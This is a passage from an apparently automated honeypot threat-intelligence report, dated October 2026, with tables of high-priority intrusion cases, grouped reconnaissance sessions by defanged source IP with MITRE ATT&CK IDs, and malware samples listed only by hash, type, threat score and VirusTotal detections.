| IR-f305d6a4a928 | HIGH | `66.116.237[.]85` | 2026-10-02 08:24 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cfafa427d073 | HIGH | `66.116.237[.]85` | 2026-10-02 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5540007df5c4 | HIGH | `103.190.7[.]203` | 2026-10-02 08:24 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c8d5898664ea | HIGH | `103.172.236[.]241` | 2026-10-02 08:42 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-66ee56cb090b | HIGH | `103.172.236[.]241` | 2026-10-02 08:42 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d1fd471e2f97 | HIGH | `138.226.239[.]234` | 2026-10-02 08:43 | Y | 0 | 0 | `T1078 · T1592` |
| IR-10691c4751b5 | HIGH | `211.253.37[.]225` | 2026-10-02 08:45 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e5bd0d1d9f41 | HIGH | `176.53.159[.]196` | 2026-10-02 08:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a3ddd3421003 | HIGH | `211.253.37[.]225` | 2026-10-02 08:45 | Y | 0 | 0 | `T1078 · T1592` |
| IR-479f2a99b081 | HIGH | `14.103.118[.]61` | 2026-10-02 08:46 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-785c9d7ac577 | HIGH | `14.103.118[.]61` | 2026-10-02 08:46 | Y | 0 | 0 | `T1078 · T1592` |
| IR-71ee1feab526 | HIGH | `120.48.8[.]170` | 2026-10-02 08:47 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6d5bcb8e7f12 | HIGH | `120.48.8[.]170` | 2026-10-02 08:47 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b82f0680195c | HIGH | `103.216.170[.]143` | 2026-10-02 08:48 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e50f67689cf7 | HIGH | `103.216.170[.]143` | 2026-10-02 08:48 | Y | 0 | 0 | `T1078 · T1592` |
| IR-61d0d156117e | HIGH | `138.226.239[.]233` | 2026-10-02 08:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5a81550ef11a | HIGH | `103.193.178[.]8` | 2026-10-02 09:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-12f76bdf5414 | HIGH | `103.193.178[.]8` | 2026-10-02 09:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0900cec4b3c8 | HIGH | `8.163.48[.]130` | 2026-10-02 09:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-999f9937d394 | HIGH | `8.163.48[.]130` | 2026-10-02 09:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f2a8377c307d | HIGH | `200.155.66[.]2` | 2026-10-02 09:07 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-0e2c5c8c9be4 | HIGH | `200.155.66[.]2` | 2026-10-02 09:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5ca0f94a9315 | HIGH | `47.243.114[.]236` | 2026-10-02 09:14 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-04697d98747e | HIGH | `47.243.114[.]236` | 2026-10-02 09:14 | Y | 0 | 0 | `T1078 · T1592` |
| IR-76ab169f16ab | HIGH | `113.240.110[.]90` | 2026-10-02 09:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b36da76b8b8a | HIGH | `113.240.110[.]90` | 2026-10-02 09:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1ab0b4fbc38a | HIGH | `77.90.185[.]17` | 2026-10-02 09:37 | Y | 0 | 0 | `T1078 · T1592` |
| IR-81645918d28a | HIGH | `103.143.11[.]150` | 2026-10-02 09:40 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9aaec9dd40c8 | HIGH | `103.143.11[.]150` | 2026-10-02 09:40 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d8856daa42c8 | HIGH | `77.90.185[.]20` | 2026-10-02 10:13 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3493cf92bde8 | HIGH | `77.90.185[.]20` | 2026-10-02 10:14 | Y | 1 | 0 | `T1021.004 · T1059.004 · T1078` |
| IR-b6bd862a5ec4 | HIGH | `176.53.159[.]196` | 2026-10-02 10:27 | Y | 0 | 0 | `T1078 · T1592` |
| IR-84cbcc1a6b69 | HIGH | `14.116.189[.]74` | 2026-10-02 10:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-cf188a25ea03 | HIGH | `14.116.189[.]74` | 2026-10-02 10:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b5f5cf264095 | HIGH | `203.167.15[.]64` | 2026-10-02 10:32 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1b968991a7b0 | HIGH | `203.167.15[.]64` | 2026-10-02 10:32 | Y | 0 | 0 | `T1078 · T1592` |
| IR-baad25a5aacf | HIGH | `68.183.92[.]206` | 2026-10-02 10:36 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-ea5c05ac658d | HIGH | `68.183.92[.]206` | 2026-10-02 10:36 | Y | 0 | 0 | `T1078 · T1592` |
| IR-d72943af45c5 | HIGH | `66.228.53[.]174` | 2026-10-02 10:42 | Y | 3 | 0 | `T1078` |
| IR-395d26827bf1 | HIGH | `107.155.48[.]46` | 2026-10-02 10:51 | Y | 0 | 0 | `T1078` |
| IR-bc260a69a34a | HIGH | `185.143.197[.]45` | 2026-10-02 10:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-4ea8463c5828 | HIGH | `185.143.197[.]45` | 2026-10-02 10:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-74dd613d03fe | HIGH | `52.140.76[.]154` | 2026-10-02 10:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-32efe98d3316 | HIGH | `52.140.76[.]154` | 2026-10-02 10:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-199fb078a024 | HIGH | `2.57.122[.]238` | 2026-10-02 11:19 | Y | 1 | 0 | `T1078 · T1592` |
| IR-32ba5ca498e4 | HIGH | `43.134.84[.]150` | 2026-10-02 11:28 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b2d641c1d8f | HIGH | `43.134.84[.]150` | 2026-10-02 11:28 | Y | 0 | 0 | `T1078 · T1592` |
| IR-bd8d0ebc88d0 | HIGH | `2.57.122[.]238` | 2026-10-02 12:00 | Y | 1 | 0 | `T1078 · T1592` |
| IR-e7a5174dce52 | HIGH | `2.57.122[.]150` | 2026-10-02 12:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
_… 62 more priority case(s) in ir_cases.json_

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `139.19.117[.]129` | **3** | 2026-10-02 05:56 | 2026-10-02 08:55 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `208.109.39[.]19` | **3** | 2026-10-02 13:53 | 2026-10-02 16:01 | 1m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-10-02 04:09 | 2026-10-02 06:03 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-02 03:09 | 2026-10-02 05:10 | 3m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-02 07:38 | 2026-10-02 09:06 | 1m | 0 | `T1592` | 🟢 LOW |
| `137.184.5[.]188` | **2** | 2026-10-02 12:06 | 2026-10-02 14:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]150` | **2** | 2026-10-02 11:54 | 2026-10-02 12:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.152.99[.]77` | **2** | 2026-10-02 03:58 | 2026-10-02 04:02 | 2m | 0 | `T1592` | 🟢 LOW |
| `92.118.39[.]77` | **2** | 2026-10-02 03:56 | 2026-10-02 04:11 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `101.66.165[.]103` | 1 | 2026-10-02 14:56 | 2026-10-02 14:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.213.48[.]58` | 1 | 2026-10-02 14:40 | 2026-10-02 14:40 | 0s | 0 | `T1592` | 🟢 LOW |
| `102.220.163[.]123` | 1 | 2026-10-02 14:49 | 2026-10-02 14:49 | 4s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-10-02 10:13 | 2026-10-02 10:13 | 10s | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]149` | 1 | 2026-10-02 15:11 | 2026-10-02 15:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `109.160.32[.]163` | 1 | 2026-10-02 08:18 | 2026-10-02 08:18 | 8s | 0 | `T1592` | 🟢 LOW |
| `113.249.103[.]140` | 1 | 2026-10-02 13:35 | 2026-10-02 13:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.191.32[.]57` | 1 | 2026-10-02 12:44 | 2026-10-02 12:46 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.34[.]40` | 1 | 2026-10-02 12:56 | 2026-10-02 12:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.145.239[.]129` | 1 | 2026-10-02 10:37 | 2026-10-02 10:39 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.26.61[.]13` | 1 | 2026-10-02 05:02 | 2026-10-02 05:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `120.48.106[.]235` | 1 | 2026-10-02 12:59 | 2026-10-02 13:01 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.53[.]159` | 1 | 2026-10-02 15:35 | 2026-10-02 15:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.142.204[.]4` | 1 | 2026-10-02 14:25 | 2026-10-02 14:25 | 26s | 0 | `T1592` | 🟢 LOW |
| `121.191.167[.]116` | 1 | 2026-10-02 07:24 | 2026-10-02 07:25 | 16s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-02 03:43 | 2026-10-02 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-02 08:39 | 2026-10-02 08:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `130.12.180[.]174` | 1 | 2026-10-02 12:36 | 2026-10-02 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `131.108.80[.]123` | 1 | 2026-10-02 12:16 | 2026-10-02 12:16 | 0s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-02 09:22 | 2026-10-02 09:23 | 4s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-02 14:42 | 2026-10-02 14:42 | 8s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-10-02 16:47 | 2026-10-02 16:47 | 3s | 0 | `T1592` | 🟢 LOW |
| `139.19.117[.]129` | 1 | 2026-10-02 02:57 | 2026-10-02 02:57 | 10s | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `14.116.189[.]74` | 1 | 2026-10-02 10:30 | 2026-10-02 10:32 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.55.148[.]34` | 1 | 2026-10-02 04:10 | 2026-10-02 04:10 | 16s | 0 | `T1592` | 🟢 LOW |
| `143.255.167[.]58` | 1 | 2026-10-02 11:31 | 2026-10-02 11:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `148.113.45[.]117` | 1 | 2026-10-02 15:50 | 2026-10-02 15:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `154.60.106[.]196` | 1 | 2026-10-02 10:39 | 2026-10-02 10:39 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.104.210[.]105` | 1 | 2026-10-02 06:37 | 2026-10-02 06:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]111` | 1 | 2026-10-02 03:50 | 2026-10-02 03:50 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]220` | 1 | 2026-10-02 13:08 | 2026-10-02 13:08 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.236.228[.]38` | 1 | 2026-10-02 08:38 | 2026-10-02 08:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `172.239.71[.]245` | 1 | 2026-10-02 05:44 | 2026-10-02 05:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `175.202.194[.]227` | 1 | 2026-10-02 12:00 | 2026-10-02 12:00 | 19s | 0 | `T1592` | 🟢 LOW |
| `176.32.193[.]16` | 1 | 2026-10-02 07:54 | 2026-10-02 07:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `180.76.250[.]204` | 1 | 2026-10-02 08:28 | 2026-10-02 08:30 | 120s | 0 | `T1592` | 🟢 LOW |
| `181.178.166[.]65` | 1 | 2026-10-02 08:26 | 2026-10-02 08:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `182.44.26[.]211` | 1 | 2026-10-02 14:58 | 2026-10-02 15:00 | 120s | 0 | `T1592` | 🟢 LOW |
| `185.180.141[.]48` | 1 | 2026-10-02 08:46 | 2026-10-02 08:46 | 8s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]158` | 1 | 2026-10-02 09:15 | 2026-10-02 09:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.247.137[.]95` | 1 | 2026-10-02 03:52 | 2026-10-02 03:52 | 1s | 0 | `T1592` | 🟢 LOW |
| `186.129.24[.]224` | 1 | 2026-10-02 13:07 | 2026-10-02 13:07 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.112.192[.]91` | 1 | 2026-10-02 07:35 | 2026-10-02 07:35 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `193.176.31[.]242` | 1 | 2026-10-02 08:03 | 2026-10-02 08:03 | 0s | 0 | `T1592` | 🟢 LOW |
| `193.47.62[.]69` | 1 | 2026-10-02 13:04 | 2026-10-02 13:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.187.176[.]86` | 1 | 2026-10-02 09:38 | 2026-10-02 09:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.44.20[.]116` | 1 | 2026-10-02 15:23 | 2026-10-02 15:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `194.88.98[.]113` | 1 | 2026-10-02 10:23 | 2026-10-02 10:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `195.9.34[.]73` | 1 | 2026-10-02 05:09 | 2026-10-02 05:09 | 7s | 0 | `T1592` | 🟢 LOW |
| `197.91.163[.]69` | 1 | 2026-10-02 11:54 | 2026-10-02 11:54 | 12s | 0 | `T1592` | 🟢 LOW |
| `198.163.195[.]76` | 1 | 2026-10-02 16:36 | 2026-10-02 16:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `199.45.154[.]72` | 1 | 2026-10-02 12:12 | 2026-10-02 12:12 | 20s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]238` | 1 | 2026-10-02 11:17 | 2026-10-02 11:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]76` | 1 | 2026-10-02 14:37 | 2026-10-02 14:37 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `20.14.94[.]13` | 1 | 2026-10-02 14:44 | 2026-10-02 14:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `20.64.96[.]42` | 1 | 2026-10-02 04:44 | 2026-10-02 04:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]151` | 1 | 2026-10-02 11:31 | 2026-10-02 11:31 | 11s | 0 | `T1592` | 🟢 LOW |
| `200.59.127[.]151` | 1 | 2026-10-02 13:45 | 2026-10-02 13:46 | 10s | 0 | `T1592` | 🟢 LOW |
| `207.175.190[.]81` | 1 | 2026-10-02 07:26 | 2026-10-02 07:26 | 14s | 0 | `T1592` | 🟢 LOW |
| `211.155.100[.]9` | 1 | 2026-10-02 08:50 | 2026-10-02 08:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `211.227.162[.]28` | 1 | 2026-10-02 10:10 | 2026-10-02 10:11 | 22s | 0 | `T1592` | 🟢 LOW |
| `220.125.218[.]30` | 1 | 2026-10-02 03:55 | 2026-10-02 03:55 | 19s | 0 | `T1592` | 🟢 LOW |
| `221.214.181[.]197` | 1 | 2026-10-02 09:31 | 2026-10-02 09:32 | 31s | 0 | `T1592` | 🟢 LOW |
| `23.94.206[.]233` | 1 | 2026-10-02 10:45 | 2026-10-02 10:46 | 30s | 0 | `T1592` | 🟢 LOW |
| `24.46.242[.]125` | 1 | 2026-10-02 06:34 | 2026-10-02 06:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | 1 | 2026-10-02 14:17 | 2026-10-02 14:17 | 0s | 0 | `T1592` | 🟢 LOW |
| `3.130.168[.]2` | 1 | 2026-10-02 07:02 | 2026-10-02 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `31.129.241[.]151` | 1 | 2026-10-02 11:15 | 2026-10-02 11:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.140.170[.]175` | 1 | 2026-10-02 04:38 | 2026-10-02 04:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `34.52.250[.]174` | 1 | 2026-10-02 08:00 | 2026-10-02 08:00 | 1s | 0 | `T1592` | 🟢 LOW |
| `34.62.39[.]253` | 1 | 2026-10-02 06:44 | 2026-10-02 06:44 | 10s | 0 | `T1592` | 🟢 LOW |
| `34.77.205[.]72` | 1 | 2026-10-02 04:38 | 2026-10-02 04:38 | 8s | 0 | `T1592` | 🟢 LOW |
| `35.146.185[.]132` | 1 | 2026-10-02 05:45 | 2026-10-02 05:46 | 13s | 0 | `T1592` | 🟢 LOW |
| `35.202.9[.]133` | 1 | 2026-10-02 14:43 | 2026-10-02 14:44 | 40s | 0 | `T1592` | 🟢 LOW |
| `36.111.40[.]138` | 1 | 2026-10-02 15:33 | 2026-10-02 15:33 | 13s | 0 | `T1592` | 🟢 LOW |
| `36.255.97[.]33` | 1 | 2026-10-02 10:11 | 2026-10-02 10:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `38.211.32[.]187` | 1 | 2026-10-02 15:44 | 2026-10-02 15:44 | 0s | 0 | `T1592` | 🟢 LOW |
| `40.124.123[.]67` | 1 | 2026-10-02 16:00 | 2026-10-02 16:01 | 9s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]141` | 1 | 2026-10-02 07:02 | 2026-10-02 07:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]18` | 1 | 2026-10-02 10:35 | 2026-10-02 10:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-10-02 03:42 | 2026-10-02 03:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-10-02 08:36 | 2026-10-02 08:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-10-02 13:35 | 2026-10-02 13:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.149[.]50` | 1 | 2026-10-02 05:12 | 2026-10-02 05:12 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]111` | 1 | 2026-10-02 06:37 | 2026-10-02 06:37 | 3s | 0 | `T1592` | 🟢 LOW |
| `45.79.207[.]129` | 1 | 2026-10-02 12:36 | 2026-10-02 12:36 | 4s | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]10` | 1 | 2026-10-02 07:55 | 2026-10-02 07:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `46.162.201[.]27` | 1 | 2026-10-02 15:31 | 2026-10-02 15:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `47.251.78[.]84` | 1 | 2026-10-02 03:54 | 2026-10-02 03:54 | 0s | 0 | `T1592` | 🟢 LOW |
| `5.158.103[.]209` | 1 | 2026-10-02 09:12 | 2026-10-02 09:12 | 13s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-10-02 08:37 | 2026-10-02 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-02 09:12 | 2026-10-02 09:13 | 41s | 0 | `T1592` | 🟢 LOW |
| `51.158.205[.]203` | 1 | 2026-10-02 13:36 | 2026-10-02 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `58.218.178[.]134` | 1 | 2026-10-02 03:16 | 2026-10-02 03:18 | 120s | 0 | `T1592` | 🟢 LOW |
| `59.2.5[.]54` | 1 | 2026-10-02 11:33 | 2026-10-02 11:33 | 17s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-02 04:04 | 2026-10-02 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `62.60.130[.]201` | 1 | 2026-10-02 16:02 | 2026-10-02 16:02 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]108` | 1 | 2026-10-02 07:46 | 2026-10-02 07:46 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.156[.]172` | 1 | 2026-10-02 07:45 | 2026-10-02 07:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.62.197[.]182` | 1 | 2026-10-02 05:25 | 2026-10-02 05:25 | 2s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-10-02 03:43 | 2026-10-02 03:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]136` | 1 | 2026-10-02 04:07 | 2026-10-02 04:07 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]140` | 1 | 2026-10-02 07:50 | 2026-10-02 07:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]193` | 1 | 2026-10-02 06:56 | 2026-10-02 06:56 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]208` | 1 | 2026-10-02 04:08 | 2026-10-02 04:08 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]162` | 1 | 2026-10-02 04:07 | 2026-10-02 04:07 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]203` | 1 | 2026-10-02 05:04 | 2026-10-02 05:04 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]102` | 1 | 2026-10-02 06:21 | 2026-10-02 06:21 | 16s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]124` | 1 | 2026-10-02 14:52 | 2026-10-02 14:52 | 1s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]73` | 1 | 2026-10-02 12:32 | 2026-10-02 12:32 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]82` | 1 | 2026-10-02 07:50 | 2026-10-02 07:51 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]98` | 1 | 2026-10-02 07:50 | 2026-10-02 07:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]99` | 1 | 2026-10-02 06:50 | 2026-10-02 06:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `66.175.213[.]4` | 1 | 2026-10-02 08:37 | 2026-10-02 08:37 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]162` | 1 | 2026-10-02 04:38 | 2026-10-02 04:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `66.228.53[.]174` | 1 | 2026-10-02 10:42 | 2026-10-02 10:42 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-10-02 14:35 | 2026-10-02 14:35 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]133` | 1 | 2026-10-02 09:57 | 2026-10-02 09:57 | 0s | 0 | `T1592` | 🟢 LOW |
| `69.5.169[.]238` | 1 | 2026-10-02 08:03 | 2026-10-02 08:03 | 10s | 0 | `T1592` | 🟢 LOW |
| `71.47.37[.]213` | 1 | 2026-10-02 14:34 | 2026-10-02 14:34 | 0s | 0 | `T1592` | 🟢 LOW |
| `71.6.167[.]142` | 1 | 2026-10-02 11:26 | 2026-10-02 11:26 | 1s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-02 07:29 | 2026-10-02 07:29 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]130` | 1 | 2026-10-02 10:55 | 2026-10-02 10:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]42` | 1 | 2026-10-02 06:56 | 2026-10-02 06:56 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.90.185[.]16` | 1 | 2026-10-02 10:00 | 2026-10-02 10:00 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.91.71[.]91` | 1 | 2026-10-02 12:35 | 2026-10-02 12:35 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.91.71[.]92` | 1 | 2026-10-02 12:36 | 2026-10-02 12:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `84.54.73[.]177` | 1 | 2026-10-02 13:25 | 2026-10-02 13:25 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.165.104[.]58` | 1 | 2026-10-02 05:36 | 2026-10-02 05:36 | 30s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]1` | 1 | 2026-10-02 03:36 | 2026-10-02 03:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]18` | 1 | 2026-10-02 03:38 | 2026-10-02 03:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `85.217.149[.]9` | 1 | 2026-10-02 16:31 | 2026-10-02 16:31 | 0s | 0 | `T1592` | 🟢 LOW |
| `86.25.152[.]198` | 1 | 2026-10-02 03:41 | 2026-10-02 03:41 | 0s | 0 | `T1592` | 🟢 LOW |
| `88.177.209[.]247` | 1 | 2026-10-02 14:16 | 2026-10-02 14:16 | 13s | 0 | `T1592` | 🟢 LOW |
| `89.149.64[.]16` | 1 | 2026-10-02 09:55 | 2026-10-02 09:55 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.21.67[.]148` | 1 | 2026-10-02 10:23 | 2026-10-02 10:23 | 0s | 0 | `T1592` | 🟢 LOW |
| `89.248.172[.]9` | 1 | 2026-10-02 09:40 | 2026-10-02 09:41 | 31s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-02 06:19 | 2026-10-02 06:19 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-02 12:49 | 2026-10-02 12:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `93.123.109[.]6` | 1 | 2026-10-02 15:02 | 2026-10-02 15:02 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `00deea7003eef2f30f2c84d1497a42c1f375d802ddd17bde455d5fde2a63631f` | ELF Binary (Linux executable) (x86-64 64-bit) | `00deea7003eef2f3...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **30/75** 🔴 |
| `04fcb4584d4de9deb015261bed95adfe0ac7e399503cff848908c1675e196148` | Bash Script | `04fcb4584d4de9de...` | 57/100 | 🟡 MEDIUM | **18/75** 🔴 |
| `062ba629c7b2b914b289c8da0573c179fe86f2cb1f70a31f9a1400d563c3042a` | ELF Binary (Linux executable) (x86-64 64-bit) | `062ba629c7b2b914...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `06901d0a279cc5a062c5de6903102edbcface166424935b01d984580c3d7a928` | Bash Script | `06901d0a279cc5a0...` | 50/100 | 🟡 MEDIUM | Not in VT |
| `072cdf382cce83bc1a59d196a09b6dd1beca38a7a697f30f826633c836952442` | Bash Script | `072cdf382cce83bc...` | 57/100 | 🟡 MEDIUM | **19/75** 🔴 |
| `07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656` | ELF Binary (Linux executable) (ARM 32-bit) | `07c0a0af63dde8dc...` | 86/100 | 🔴 HIGH | **40/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
